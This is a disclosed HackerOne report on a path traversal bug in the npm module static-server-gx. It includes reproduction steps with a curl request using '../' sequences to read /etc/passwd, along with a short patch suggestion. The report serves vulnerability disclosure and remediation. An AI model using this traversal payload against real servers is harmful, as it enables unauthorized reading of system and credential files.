---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '581939'
original_report_id: '581939'
title: '[static-server-gx] Path Traversal allowing to read any files on the server'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2019-05-16T04:34:07.806Z'
disclosed_at: '2020-09-03T00:44:44.737Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [static-server-gx] Path Traversal allowing to read any files on the server

## Metadata

- HackerOne Report ID: 581939
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-03T00:44:44.737Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report path traversal vulnerability in module "static-server-gx"
It allows an attacker to read any files even system files via this path traversal vulnerability.

# Module

module name: static-server-gx
version: 1.2.1
npm page: https://www.npmjs.com/package/static-server-gx

# Module Description
N/A

# Module Stats
[21] downloads in the last week
[77] downloads in the last month

# Vulnerability

##Vulnerability Description
Path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.

##Steps To Reproduce:
- Install the module
```
npm install -g static-server-gx
```

- Run 'static-server-gx in "~/Desktop" directory:
```
nodejs /usr/lib/node_modules/static-server-gx/server.js 
```

- Use cURL to access etc/passwd file:
```
curl --path-as-is --url "localhost:10000/../../../../etc/passwd"
```
{F491057}

## Patch
User input should be properly sanitized and filtered to remove dot-dot-slash (../)” sequences and its variations in path. 

## Supporting Material/References:
- Linux kali 4.15.0-kali2-amd64
- node 10.15.3
- npm 6.9
- Firefox ESR 52.7.3 (64-bit)

## Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It could have enabled an attacker to view system files and leverage attacks like remote code execution and so on.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
